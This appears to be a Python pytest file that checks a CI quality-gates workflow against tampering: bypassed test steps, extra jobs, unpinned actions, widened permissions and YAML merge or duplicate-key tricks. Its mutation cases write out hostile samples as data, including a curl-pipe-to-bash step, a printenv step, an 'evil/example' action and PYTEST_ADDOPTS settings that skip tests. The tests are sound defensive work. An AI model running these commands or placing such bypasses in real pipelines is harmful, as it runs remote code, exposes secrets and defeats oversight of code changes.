        ),
        (
            "security_or_true",
            "      - name: Security tests\n        run: uv run pytest tests/security -q\n",
            "      - name: Security tests\n        run: uv run pytest tests/security -q || true\n",
        ),
        (
            "boot_acceptance_continue_on_error",
            "      - name: BOOT acceptance tests\n        run: uv run pytest tests/acceptance -q\n",
            "      - name: BOOT acceptance tests\n"
            "        continue-on-error: true\n"
            "        run: uv run pytest tests/acceptance -q\n",
        ),
        (
            "frontend_tests_exit_zero",
            "      - name: apps/web tests\n        run: pnpm --dir apps/web test\n",
            "      - name: apps/web tests\n        run: pnpm --dir apps/web test; exit 0\n",
        ),
    ),
)
def test_quality_gate_required_steps_reject_representative_bypass_variants(
    case_id: str,
    original: str,
    replacement: str,
) -> None:
    workflow_text = _quality_gates_workflow_text().replace(original, replacement)

    assert _security_violations_for_workflow_text(workflow_text), case_id


@pytest.mark.parametrize(
    ("case_id", "original", "replacement"),
    (
        (
            "python_job_if_false",
            "  python:\n    name: Python, Backend, Providers, Integration\n",
            "  python:\n    if: false\n    name: Python, Backend, Providers, Integration\n",
        ),
        (
            "python_job_continue_on_error",
            "  python:\n    name: Python, Backend, Providers, Integration\n",
            "  python:\n"
            "    continue-on-error: true\n"
            "    name: Python, Backend, Providers, Integration\n",
        ),
        (
            "frontend_job_defaults",
            "  frontend:\n    name: Frontend\n",
            "  frontend:\n    defaults:\n      run:\n        shell: bash {0}\n    name: Frontend\n",
        ),
    ),
)
def test_quality_gate_required_jobs_reject_bypass_variants(
    case_id: str,
    original: str,
    replacement: str,
) -> None:
    workflow_text = _quality_gates_workflow_text().replace(original, replacement)

    assert _security_violations_for_workflow_text(workflow_text), case_id


def test_quality_gate_workflow_action_pin_detector_rejects_floating_action(
    tmp_path: Path,
) -> None:
    workflow_path = tmp_path / "quality-gates.yml"
    workflow_path.write_text(
        _quality_gates_workflow_text().replace(
            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
            "actions/checkout@v4",
            1,
        ),
        encoding="utf-8",
    )
    original_workflow_path = QUALITY_GATES_WORKFLOW
    try:
        globals()["QUALITY_GATES_WORKFLOW"] = workflow_path
        with pytest.raises(AssertionError, match="not pinned to a full immutable SHA"):
            test_quality_gate_workflow_preserves_boot_security_model_and_runs_m0_gates()
    finally:
        globals()["QUALITY_GATES_WORKFLOW"] = original_workflow_path


def _workflow_with_python_step_after_m0(step_text: str) -> str:
    anchor = f"      - name: M0 integration tests\n        run: {M0_INTEGRATION_GATE_COMMAND}\n"
    return _quality_gates_workflow_text().replace(anchor, f"{anchor}\n{step_text}")


def _workflow_with_frontend_step_after_tests(step_text: str) -> str:
    anchor = "      - name: apps/web tests\n        run: pnpm --dir apps/web test\n"
    return _quality_gates_workflow_text().replace(anchor, f"{anchor}\n{step_text}")


def _workflow_with_job_preamble(job_name: str, preamble: str) -> str:
    marker = f"  {job_name}:\n"
    return _quality_gates_workflow_text().replace(marker, f"{marker}{preamble}", 1)


def _workflow_with_step_extra(
    step_name: str,
    run_line: str,
    extra: str,
) -> str:
    anchor = f"      - name: {step_name}\n        run: {run_line}\n"
    replacement = f"      - name: {step_name}\n{extra}        run: {run_line}\n"
    return _quality_gates_workflow_text().replace(
        anchor,
        replacement,
    )


def _workflow_execution_surface_mutation(case_id: str) -> str:
    base = _quality_gates_workflow_text()
    unknown_sha = "0123456789abcdef0123456789abcdef01234567"
    mutations = {
        "A_extra_deploy_job_with_run": lambda: (
            base + "\n  deploy:\n"
            "    name: Deploy\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 5\n"
            "    steps:\n"
            "      - name: Deploy\n"
            "        run: echo deploy\n"
        ),
        "B_extra_arbitrary_job": lambda: (
            base + "\n  arbitrary:\n"
            "    name: Arbitrary\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 5\n"
            "    steps:\n"
            "      - name: Arbitrary\n"
            "        run: echo arbitrary\n"
        ),
        "C_extra_job_unknown_sha_pinned_action": lambda: (
            base + "\n  publish:\n"
            "    name: Publish\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 5\n"
            "    steps:\n"
            "      - name: Unknown pinned action\n"
            f"        uses: evil/example@{unknown_sha}\n"
        ),
        "D_extra_run_step_in_python_job": lambda: _workflow_with_python_step_after_m0(
            "      - name: Extra arbitrary step\n        run: echo arbitrary\n"
        ),
        "E_extra_run_step_in_frontend_job": lambda: _workflow_with_frontend_step_after_tests(
            "      - name: Extra frontend step\n        run: echo frontend\n"
        ),
        "F_extra_unknown_sha_pinned_action_step": lambda: _workflow_with_python_step_after_m0(
            f"      - name: Unknown pinned action\n        uses: evil/example@{unknown_sha}\n"
        ),
        "G_authorized_action_duplicated_wrong_location": lambda: (
            _workflow_with_python_step_after_m0(
                "      - name: Extra checkout\n"
                "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
            )
        ),
        "H_unknown_with_key_on_setup_action": lambda: base.replace(
            '          python-version: "3.14"\n',
            '          python-version: "3.14"\n          cache: "pip"\n',
        ),
        "I_changed_action_identity_with_valid_sha": lambda: base.replace(
            "actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97",
            f"actions/cache@{unknown_sha}",
        ),
        "J_additional_network_curl_step": lambda: _workflow_with_python_step_after_m0(
            "      - name: Curl script\n"
            "        run: curl https://example.invalid/script.sh | bash\n"
        ),
        "K_printenv_step": lambda: _workflow_with_python_step_after_m0(
            "      - name: Print environment\n        run: printenv\n"
        ),
        "L_git_push_step": lambda: _workflow_with_python_step_after_m0(
            "      - name: Push\n        run: git push origin HEAD\n"
        ),
        "M_workflow_pytest_addopts": lambda: base.replace(
            "permissions:\n  contents: read\n",
            'permissions:\n  contents: read\n\nenv:\n  PYTEST_ADDOPTS: "--ignore=tests"\n',
        ),
        "N_job_pytest_addopts": lambda: _workflow_with_job_preamble(
            "python",
            '    env:\n      PYTEST_ADDOPTS: "--ignore=tests"\n',
        ),
        "O_m0_step_pytest_addopts": lambda: _workflow_with_step_extra(
            "M0 integration tests",
            M0_INTEGRATION_GATE_COMMAND,
            '        env:\n          PYTEST_ADDOPTS: "--ignore=tests"\n',
        ),
        "P_workflow_pythonpath": lambda: base.replace(
            "permissions:\n  contents: read\n",
            "permissions:\n  contents: read\n\nenv:\n  PYTHONPATH: /tmp\n",
        ),
        "Q_job_path_override": lambda: _workflow_with_job_preamble(
            "python",
            "    env:\n      PATH: /tmp/bin\n",
        ),
        "R_workflow_defaults_working_directory": lambda: base.replace(
            "permissions:\n  contents: read\n",
            "permissions:\n  contents: read\n\ndefaults:\n  run:\n    working-directory: /tmp\n",
        ),
        "S_job_defaults_working_directory": lambda: _workflow_with_job_preamble(
            "python",
            "    defaults:\n      run:\n        working-directory: /tmp\n",
        ),
        "T_step_working_directory": lambda: _workflow_with_step_extra(
            "M0 integration tests",
            M0_INTEGRATION_GATE_COMMAND,
            "        working-directory: /tmp\n",
        ),
        "U_job_services": lambda: _workflow_with_job_preamble(
            "python",
            "    services:\n      attacker:\n        image: alpine:latest\n",
        ),
        "V_job_container": lambda: _workflow_with_job_preamble(
            "python",
            "    container: alpine:latest\n",
        ),
        "W_self_hosted_runner": lambda: base.replace(
            "    runs-on: ubuntu-24.04\n",
            "    runs-on: self-hosted\n",
            1,
        ),
        "X_job_strategy": lambda: _workflow_with_job_preamble(
            "python",
            "    strategy:\n      matrix:\n        shard: [1]\n",
        ),
        "Y_job_needs": lambda: _workflow_with_job_preamble(
            "frontend",
            "    needs: python\n",
        ),
        "Z_workflow_concurrency": lambda: base.replace(
            "permissions:\n  contents: read\n",
            "permissions:\n  contents: read\n\nconcurrency: ci\n",
        ),
        "extra_job_with_only_authorized_action": lambda: (
            base + "\n  extra-checkout:\n"
            "    name: Extra Checkout\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 5\n"
            "    steps:\n"
            "      - name: Check out repository\n"
            "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
        ),
        "extra_step_with_exact_authorized_command": lambda: _workflow_with_python_step_after_m0(
            f"      - name: Extra M0 integration copy\n        run: {M0_INTEGRATION_GATE_COMMAND}\n"
        ),
        "wrong_repo_valid_sha": lambda: base.replace(
            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
            f"actions/checkout-fork@{unknown_sha}",
            1,
        ),
        "env_pytest_deselection": lambda: _workflow_with_step_extra(
            "M0 integration tests",
            M0_INTEGRATION_GATE_COMMAND,
            '        env:\n          PYTEST_ADDOPTS: "-k not vertical"\n',
        ),
    }
    return mutations[case_id]()


@pytest.mark.parametrize(
    "case_id",
    (
        "A_extra_deploy_job_with_run",
        "B_extra_arbitrary_job",
        "C_extra_job_unknown_sha_pinned_action",
        "D_extra_run_step_in_python_job",
        "E_extra_run_step_in_frontend_job",
        "F_extra_unknown_sha_pinned_action_step",
        "G_authorized_action_duplicated_wrong_location",
        "H_unknown_with_key_on_setup_action",
        "I_changed_action_identity_with_valid_sha",
        "J_additional_network_curl_step",
        "K_printenv_step",
        "L_git_push_step",
        "M_workflow_pytest_addopts",
        "N_job_pytest_addopts",
        "O_m0_step_pytest_addopts",
        "P_workflow_pythonpath",
        "Q_job_path_override",
        "R_workflow_defaults_working_directory",
        "S_job_defaults_working_directory",
        "T_step_working_directory",
        "U_job_services",
        "V_job_container",
        "W_self_hosted_runner",
        "X_job_strategy",
        "Y_job_needs",
        "Z_workflow_concurrency",
        "extra_job_with_only_authorized_action",
        "extra_step_with_exact_authorized_command",
        "wrong_repo_valid_sha",
        "env_pytest_deselection",
    ),
)
def test_quality_gate_workflow_rejects_unapproved_executable_surface(case_id: str) -> None:
    workflow_text = _workflow_execution_surface_mutation(case_id)

    assert _security_violations_for_workflow_text(workflow_text), case_id


def test_quality_gate_workflow_accepts_harmless_yaml_formatting_rewrite() -> None:
    workflow_text = _quality_gates_workflow_text().replace(
        "      - name: Validate LOCAL_DOCKER PostgreSQL compose config\n"
        "        run: >\n"
        "          docker compose\n"
        "          --env-file infrastructure/local/docker/.env.example\n"
        "          -f infrastructure/local/docker/compose.yaml\n"
        "          config --quiet\n",
        "      - name: Validate LOCAL_DOCKER PostgreSQL compose config\n"
        "        run: docker compose --env-file infrastructure/local/docker/.env.example "
        "-f infrastructure/local/docker/compose.yaml config --quiet\n",
    )

    assert not _security_violations_for_workflow_text(workflow_text)


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "A_top_level_id_token_write",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              id-token: write
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "B_top_level_contents_write",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: write
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "C_top_level_packages_write",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              packages: write
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "D_top_level_contents_read_plus_id_token_write",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
              id-token: write
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "E_missing_permissions",
            """
            name: Quality Gates
            on:
              push:
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "F_empty_mapping_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions: {}
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "G_null_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions: null
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "H_read_all_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions: read-all
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "I_write_all_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions: write-all
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "J_unexpected_permission_key",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
              attestations: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "K_job_contents_write_normal_indent",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                permissions:
                  contents: write
                steps: []
            """,
        ),
        (
            "L_job_contents_write_four_space_indent",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
                python:
                    runs-on: ubuntu-24.04
                    permissions:
                        contents: write
                    steps: []
            """,
        ),
        (
            "M_job_id_token_write",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                permissions:
                  id-token: write
                steps: []
            """,
        ),
        (
            "N_job_packages_write",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                permissions:
                  packages: write
                steps: []
            """,
        ),
        (
            "O_job_contents_read",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              frontend:
                runs-on: ubuntu-24.04
                permissions:
                  contents: read
                steps: []
            """,
        ),
        (
            "P_job_empty_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              anything:
                runs-on: ubuntu-24.04
                permissions: {}
                steps: []
            """,
        ),
        (
            "Q_job_null_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              anything:
                runs-on: ubuntu-24.04
                permissions: null
                steps: []
            """,
        ),
        (
            "R_job_read_all_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              anything:
                runs-on: ubuntu-24.04
                permissions: read-all
                steps: []
            """,
        ),
        (
            "S_job_write_all_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              anything:
                runs-on: ubuntu-24.04
                permissions: write-all
                steps: []
            """,
        ),
        (
            "T_differently_named_job_permissions",
            """
            name: Quality Gates
            on:
              push:
            permissions:
              contents: read
            jobs:
              quiet-but-broad:
                permissions:
                  contents: write
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
    ),
)
def test_quality_gate_permission_detector_rejects_non_frozen_permission_models(
    case_id: str,
    workflow_text: str,
) -> None:
    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
    assert _workflow_permission_violations(workflow), case_id


def test_quality_gate_permission_detector_accepts_only_frozen_read_only_model() -> None:
    workflow_text = """
    name: Quality Gates
    on:
      push:
    permissions:
      contents: read
    jobs:
      python:
        runs-on: ubuntu-24.04
        steps: []
    """

    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))

    assert not _workflow_permission_violations(workflow)


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "A_duplicate_top_level_permissions_write_then_read",
            """
            name: Quality Gates
            permissions:
              contents: write
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "B_duplicate_top_level_permissions_read_then_write",
            """
            name: Quality Gates
            permissions:
              contents: read
            permissions:
              contents: write
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "C_duplicate_jobs_key",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            jobs:
              frontend:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "D_duplicate_job_name_unsafe_then_safe",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                permissions:
                  contents: write
                steps: []
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "E_duplicate_job_name_safe_then_unsafe",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
              python:
                runs-on: ubuntu-24.04
                permissions:
                  contents: write
                steps: []
            """,
        ),
        (
            "F_duplicate_permissions_key_inside_job",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                permissions:
                  contents: read
                permissions:
                  contents: write
                steps: []
            """,
        ),
        (
            "G_duplicate_contents_key_inside_top_level_permissions",
            """
            name: Quality Gates
            permissions:
              contents: write
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "H_duplicate_arbitrary_mapping_key_elsewhere",
            """
            name: Quality Gates
            permissions:
              contents: read
            env:
              CI_MODE: safe
              CI_MODE: unsafe
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "I_duplicate_trigger_key",
            """
            name: Quality Gates
            on:
              push:
              push:
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "flow_style_duplicate_mapping",
            """
            name: Quality Gates
            permissions: {contents: write, contents: read}
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "comments_between_duplicate_permission_definitions",
            """
            name: Quality Gates
            permissions:
              contents: write
            # Comments must not make a duplicate security-sensitive key safe.
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
    ),
)
def test_quality_gate_workflow_parser_rejects_duplicate_mapping_keys(
    case_id: str,
    workflow_text: str,
) -> None:
    with pytest.raises(AssertionError, match="duplicate YAML mapping key"):
        _parse_quality_gate_workflow(textwrap.dedent(workflow_text))


@pytest.mark.parametrize(
    ("case_id", "workflow_text", "expected_message"),
    (
        (
            "J_job_permissions_inherited_through_merge",
            """
            name: Quality Gates
            permissions:
              contents: read
            shared: &shared_job_permissions
              permissions:
                contents: write
            jobs:
              python:
                <<: *shared_job_permissions
                runs-on: ubuntu-24.04
                steps: []
            """,
            "YAML anchors are not authorized|YAML aliases are not authorized|YAML merge keys",
        ),
        (
            "K_top_level_permission_mapping_introduced_through_merge",
            """
            name: Quality Gates
            <<:
              permissions:
                contents: write
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
            "YAML merge keys",
        ),
        (
            "L_merged_job_definition_containing_permissions",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                <<:
                  permissions:
                    contents: write
                runs-on: ubuntu-24.04
                steps: []
            """,
            "YAML merge keys",
        ),
        (
            "M_anchor_alias_supplies_permissioned_job",
            """
            name: Quality Gates
            permissions:
              contents: read
            job_template: &permissioned_job
              runs-on: ubuntu-24.04
              permissions:
                contents: write
              steps: []
            jobs:
              python: *permissioned_job
            """,
            "YAML anchors are not authorized|YAML aliases are not authorized",
        ),
        (
            "harmless_anchor_is_still_rejected_fail_closed",
            """
            name: Quality Gates
            permissions:
              contents: read
            harmless: &harmless value
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
            "YAML anchors are not authorized",
        ),
    ),
)
def test_quality_gate_workflow_parser_rejects_merge_anchors_and_aliases(
    case_id: str,
    workflow_text: str,
    expected_message: str,
) -> None:
    with pytest.raises(AssertionError, match=expected_message):
        _parse_quality_gate_workflow(textwrap.dedent(workflow_text))


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "two_space_job_indentation",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                permissions:
                  contents: write
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "four_space_job_indentation",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
                python:
                    permissions:
                        contents: write
                    runs-on: ubuntu-24.04
                    steps: []
            """,
        ),
        (
            "deeper_valid_job_indentation",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
                  python:
                      runs-on: ubuntu-24.04
                      permissions:
                          contents: write
                      steps: []
            """,
        ),
        (
            "comments_between_job_and_permissions",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                # This comment must not hide the semantic permission override.
                permissions:
                  contents: write
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "permissions_before_other_job_keys",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                permissions:
                  contents: write
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "permissions_after_other_job_keys",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
                permissions:
                  contents: write
            """,
        ),
        (
            "multiple_jobs_second_has_permissions",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
              frontend:
                runs-on: ubuntu-24.04
                permissions:
                  contents: write
                steps: []
            """,
        ),
    ),
)
def test_quality_gate_permission_detector_rejects_job_permission_formatting_variants(
    case_id: str,
    workflow_text: str,
) -> None:
    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
    assert _workflow_permission_violations(workflow), case_id


@pytest.mark.parametrize(
    "workflow_text",
    (
        """
        name: Quality Gates
        permissions: # comments do not change the frozen model
          contents: read # checkout only
        jobs:
          python:
            runs-on: ubuntu-24.04
            steps: []
        """,
        """
        jobs:
          python:
            steps: []
            runs-on: ubuntu-24.04
        permissions:
          "contents": "read"
        name: Quality Gates
        """,
        """
        name: Quality Gates
        "on": {push: null}
        permissions: {contents: "read"}
        jobs: {python: {runs-on: ubuntu-24.04, steps: []}}
        """,
    ),
)
def test_quality_gate_permission_detector_accepts_harmless_yaml_formatting(
    workflow_text: str,
) -> None:
    workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
    assert not _workflow_permission_violations(workflow)


@pytest.mark.parametrize(
    ("case_id", "workflow_text"),
    (
        (
            "root_is_not_mapping",
            """
            - name: Quality Gates
            - permissions:
                contents: read
            """,
        ),
        (
            "jobs_missing",
            """
            name: Quality Gates
            permissions:
              contents: read
            """,
        ),
        (
            "jobs_not_mapping",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs: nope
            """,
        ),
        (
            "job_value_not_mapping",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python: nope
            """,
        ),
        (
            "permissions_list_instead_of_mapping",
            """
            name: Quality Gates
            permissions:
              - contents
              - read
            jobs:
              python:
                runs-on: ubuntu-24.04
                steps: []
            """,
        ),
        (
            "job_permissions_list_instead_of_absent",
            """
            name: Quality Gates
            permissions:
              contents: read
            jobs:
              python:
                runs-on: ubuntu-24.04
                permissions:
                  - contents
                  - read
                steps: []
            """,
        ),
    ),
)
def test_quality_gate_permission_detector_rejects_malformed_security_structures(
    case_id: str,
    workflow_text: str,
) -> None:
    try:
        workflow = _parse_quality_gate_workflow(textwrap.dedent(workflow_text))
    except AssertionError:
        return

    assert _workflow_permission_violations(workflow), case_id


@pytest.mark.parametrize(
    "package_root",
    tuple(
        sorted(
            M0_DEFERRED_PACKAGE_ROOTS
            | M1_PLANNED_BUT_UNAUTHORIZED_PACKAGE_ROOTS
            | M1_PLUS_EXAMPLE_PACKAGE_ROOTS
        )
    ),
)
def test_m0_package_topology_rejects_unvalidated_future_runtime_surfaces(
    package_root: str,
) -> None:
    simulated_roots = ALLOWED_PACKAGE_ROOTS | {package_root}

    assert _unauthorized_package_roots(simulated_roots) == {package_root}


@pytest.mark.parametrize("top_level_root", tuple(sorted(M0_DEFERRED_TOP_LEVEL_ROOTS)))
def test_m0_top_level_topology_rejects_broad_runtime_roots(top_level_root: str) -> None:
    simulated_roots = ALLOWED_TOP_LEVEL_PATHS | {top_level_root}

    assert simulated_roots - ALLOWED_TOP_LEVEL_PATHS == {top_level_root}


def test_m0_app_topology_does_not_broaden_beyond_authorized_boot_apps() -> None:
    simulated_roots = ALLOWED_APP_ROOTS | {"apps/admin", "apps/agent-console"}

    assert _unauthorized_app_roots(simulated_roots) == {"apps/admin", "apps/agent-console"}


def test_m0_planned_surface_registry_is_task_scoped_and_current_authorization_is_exact() -> None:
    assert M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK["TASK-M0-002"] == {
        "packages/python/curios_persistence"
    }
    assert M0_PLANNED_PACKAGE_ROOTS_BY_TASK["TASK-M0-003"] == {"packages/python/curios_policy"}
    assert M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK["TASK-M0-003"] == {"packages/python/curios_policy"}
    assert M0_PLANNED_PACKAGE_ROOTS_BY_TASK["TASK-M0-004"] == {"packages/python/curios_runtime"}
    assert M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK["TASK-M0-004"] == {"packages/python/curios_runtime"}
    assert M0_PLANNED_PACKAGE_ROOTS_BY_TASK["TASK-M0-005"] == {"packages/python/curios_runtime"}
    assert M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK["TASK-M0-005"] == {"packages/python/curios_runtime"}
    assert M0_PLANNED_PACKAGE_ROOTS_BY_TASK["TASK-M0-006"] == {"packages/python/curios_runtime"}
    assert M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK["TASK-M0-006"] == {"packages/python/curios_runtime"}
    assert M0_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK["TASK-M0-006"] == {"single_step_runtime.py"}
    assert M0_PLANNED_PACKAGE_ROOTS_BY_TASK["TASK-M0-007"] == {"packages/python/curios_runtime"}
    assert M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK["TASK-M0-007"] == {"packages/python/curios_runtime"}
    assert M0_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK["TASK-M0-007"] == {
        "provider_inventory_executor.py"
    }
    assert M1_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK["TASK-M1-006"] == {"agent_repository.py"}
    assert M1_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK["TASK-M1-007"] == {
        "agent_lifecycle_repository.py"
    }
    assert M0_PLANNED_APP_ROOTS_BY_TASK["TASK-M0-008"] == {"apps/api"}
    assert M0_AUTHORIZED_API_SOURCE_FILES_BY_TASK["TASK-M0-008"] == {
        "composition.py",
        "service.py",
    }
    assert M0_AUTHORIZED_API_TEST_FILES_BY_TASK["TASK-M0-008"] == {
        "test_fastapi_service_composition.py",
        "test_m0_work_endpoints.py",
    }
    assert M0_PLANNED_APP_ROOTS_BY_TASK["TASK-M0-009"] == {"apps/web"}
    assert M0_AUTHORIZED_WEB_SOURCE_FILES_BY_TASK["TASK-M0-009"] == {
        "App.css",
        "App.test.tsx",
        "App.tsx",
        "apiBoundary.ts",
        "main.tsx",
    }
    assert M0_PLANNED_TEST_ROOTS_BY_TASK["TASK-M0-010"] == {"tests/integration"}
    assert AUTHORIZED_M0_INTEGRATION_TESTS_BY_TASK["TASK-M0-010"] == {
        "tests/integration/test_m0_vertical_slice_integration.py"
    }
    assert M0_PLANNED_TEST_ROOTS_BY_TASK["TASK-M0-012"] == {"tests/acceptance"}
    assert AUTHORIZED_M0_ACCEPTANCE_TESTS_BY_TASK["TASK-M0-012"] == {
        "tests/acceptance/test_m0_acceptance.py"
    }
    assert M0_DEFERRED_PACKAGE_ROOTS.isdisjoint(ALLOWED_PACKAGE_ROOTS)


def test_m1_planned_surface_registry_does_not_authorize_future_surfaces() -> None:
    assert {
        "TASK-M1-002",
        "TASK-M1-003",
        "TASK-M1-004",
        "TASK-M1-005",
        "TASK-M1-006",
        "TASK-M1-007",
        "TASK-M1-008",
        "TASK-M1-009",
        "TASK-M1-010",
        "TASK-M1-011",
        "TASK-M1-012",
        "TASK-M1-013",
        "TASK-M1-014",
        "TASK-M1-015",
        "TASK-M1-016",
        "TASK-M1-017",
    } == M1_PLANNED_SURFACE_TASKS
    assert {
        "TASK-M1-001",
        "TASK-M1-002",
        "TASK-M1-003",
        "TASK-M1-004",
        "TASK-M1-005",
        "TASK-M1-006",
        "TASK-M1-007",
        "TASK-M1-008",
    } == (M1_CURRENTLY_AUTHORIZED_SURFACE_TASKS)
    assert M1_PLANNED_BUT_UNAUTHORIZED_PACKAGE_ROOTS.isdisjoint(ALLOWED_PACKAGE_ROOTS)
    assert M1_PLANNED_SURFACES_BY_TASK["TASK-M1-002"] == {
        "packages/python/curios_contracts",
        "packages/typescript/curios-contracts",
    }
    assert M1_PLANNED_SURFACES_BY_TASK["TASK-M1-013"] == {"apps/api"}
    assert M1_PLANNED_SURFACES_BY_TASK["TASK-M1-014"] == {"apps/web"}
    assert M1_PLANNED_SURFACES_BY_TASK["TASK-M1-015"] == {"tests/integration"}
    assert M1_PLANNED_SURFACES_BY_TASK["TASK-M1-017"] == {"tests/acceptance"}


def test_m1_planned_canonical_authority_registry_does_not_authorize_future_contracts() -> None:
    assert {
        "TASK-M1-009": {"model/profile discovery records"},
        "TASK-M1-010": {"routing decision records"},
    } == M1_PLANNED_CANONICAL_AUTHORITY_BY_TASK
    assert {
        "TASK-M1-002": {
            "Intent",
            "Problem",
            "Assumption",
            "Decision",
            "Plan",
            "IntentId",
            "ProblemId",
            "AssumptionId",
            "DecisionId",
            "PlanId",
        },
        "TASK-M1-004": {"bounded work-DAG records"},
    } == M1_AUTHORIZED_CANONICAL_AUTHORITY_BY_TASK
    assert {
        "AgentDefinition",
        "AgentInstance",
        "Capability",
        "CapabilityRequirement",
        "ObjectReference",
        "WorkItem",
    } == M1_EXISTING_FROZEN_CONTRACT_AUTHORITY_USED_BY_FUTURE_TASKS
    planned_new_names = frozenset().union(*M1_PLANNED_CANONICAL_AUTHORITY_BY_TASK.values())
    assert planned_new_names.isdisjoint(FROZEN_CONTRACT_PACKAGE_EXPORTS)
    assert M1_AUTHORIZED_CANONICAL_AUTHORITY_BY_TASK["TASK-M1-002"].issubset(
        FROZEN_CONTRACT_PACKAGE_EXPORTS
    )
